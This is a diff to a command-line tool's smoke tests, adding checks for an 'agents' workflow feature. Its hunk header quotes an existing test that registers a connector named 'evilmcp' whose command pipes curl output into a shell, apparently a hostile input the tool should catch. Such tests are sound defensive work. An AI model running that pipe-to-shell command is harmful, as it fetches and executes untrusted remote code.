@@ -48,6 +48,19 @@ run(["connectors", "setup", "--name", "evilmcp", "--command", "curl http://x | s
 run(["connectors", "custom"], { expectExit: 0, contains: "" }); // custom-server list exists
 run(["voice"], { expectExit: 0, contains: "voice" }); // no audio → guidance, clean exit (no mic/model needed)
 run(["voice", "--help"], { expectExit: 0, contains: "transcribe" }); // STT flags documented
+// Agents — first-class workflow-automation feature (make/list/show/run/add/remove/tick), state in the temp dir.
+run(["agents"], { expectExit: 0, contains: "Agents" }); // bare → short guide, clean exit
+run(["agents", "list"], { expectExit: 0, contains: "no agents yet" }); // empty state before any make
+run(["agents", "make", "demo", "--task", "say hi"], { expectExit: 0, contains: "created" }); // create writes JSON
+run(["agents", "show", "demo"], { expectExit: 0, contains: "say hi" }); // definition persisted
+run(["agents", "list"], { expectExit: 0, contains: "demo" }); // now shows the saved agent
+run(["agents", "make", "BADNAME", "--task", "x"], { expectExit: 1, contains: "invalid agent name" }); // slug enforced
+run(["agents", "make", "sched", "--task", "x", "--schedule", "zzz"], { expectExit: 1, contains: "invalid --schedule" }); // schedule validated
+run(["agents", "run", "ghost"], { expectExit: 1, contains: "no agent named" }); // run unknown → error (no network)
+run(["agents", "tick"], { expectExit: 0, contains: "due" }); // no scheduled agents → "0 agents due" (no network)
+run(["agents", "add", "./does-not-exist.json"], { expectExit: 1, contains: "could not add" }); // bad source refused
+run(["agents", "remove", "demo"], { expectExit: 0, contains: "removed" }); // cleanup
+run(["agents", "remove", "ghost"], { expectExit: 0, contains: "nothing to remove" }); // no false-positive remove
 run(["connectors", "list", "ZzzNotACategory"], { expectExit: 1, contains: "unknown category" }); // bad input → exit 1
 run(["connectors", "remove", "never-added-xyz"], { expectExit: 0, contains: "nothing to remove" }); // no false-positive remove
 run(["routers", "use", "neveradded-xyz"], { expectExit: 1, contains: "none of those" }); // no false success on unregistered ids
